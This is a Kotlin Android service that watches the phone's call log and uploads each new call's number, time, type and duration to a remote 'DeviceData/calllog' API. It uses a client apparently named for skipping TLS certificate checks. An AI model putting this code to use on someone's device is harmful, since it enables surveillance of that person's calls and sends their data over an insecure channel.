package com.example.bullsseeclient.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.database.Cursor
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.HandlerThread
import androidx.core.app.NotificationCompat
import com.example.bullsseeclient.HttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.time.Instant
import com.google.gson.annotations.SerializedName

class SmsCallMonitorService : Service() {
    private var observerThread: HandlerThread? = null
    private var callLogObserver: ContentObserver? = null
    private var lastSentId: Long = -1L
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        android.util.Log.d("SmsCallMonitorService", "onCreate")
        startForeground()
        observerThread = HandlerThread("CallLogObserver").also { it.start() }
        val handler = Handler(observerThread!!.looper)
        callLogObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                onChange(selfChange, null)
            }
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                processLatestCall()
            }
        }
        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("SmsCallMonitorService", "onStartCommand")
        return START_STICKY
    }

    private fun startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("CALL_MONITOR", "Call Monitor", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification: Notification = NotificationCompat.Builder(this, "CALL_MONITOR")
            .setContentTitle("Call Monitor")
            .setContentText("Monitoring calls")
            .setSmallIcon(android.R.drawable.stat_sys_phone_call)
            .build()
        startForeground(1001, notification)
    }

    private fun sendCallEventFromLog(dto: CallDto) {
        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=${dto.number} date=${dto.date} type=${dto.type} duration=${dto.duration}")
        val retrofit = Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()
        val api = retrofit.create(Api::class.java)
        val payload = listOf(dto)
        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
        api.send(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
                android.util.Log.d("SmsCallMonitorService", "upload status=${response.code()}")
            }
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {
                android.util.Log.e("SmsCallMonitorService", "upload error=${t.message}")
            }
        })
    }

    private fun processLatestCall() {
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE, CallLog.Calls.DURATION)
        val sortOrder = CallLog.Calls.DATE + " DESC"
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, sortOrder)
            if (cursor != null && cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID))
                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val durationVal = if (durationIdx != -1) cursor.getInt(durationIdx) else null
                if (id != lastSentId) {
                    lastSentId = id
                    val typeStr = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "ANSWERED_EXTERNALLY"
                        else -> "UNKNOWN"
                    }
                    val dateIso = Instant.ofEpochMilli(date).toString()
                    sendCallEventFromLog(CallDto(number = number, date = dateIso, type = typeStr, duration = durationVal))
                }
            }
        } catch (e: SecurityException) {
            android.util.Log.e("SmsCallMonitorService", "READ_CALL_LOG not granted: ${e.message}")
        } catch (e: Exception) {
            android.util.Log.e("SmsCallMonitorService", "CallLog observer query error: ${e.message}")
        } finally {
            cursor?.close()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
        observerThread?.quitSafely()
    }

    interface Api {
        @retrofit2.http.POST("api/DeviceData/calllog")
        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
    }

    data class CallDto(
        @SerializedName("Number") val number: String?,
        @SerializedName("Date") val date: String,
        @SerializedName("Type") val type: String,
        @SerializedName("Duration") val duration: Int?
    )

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, SmsCallMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }
    }
}
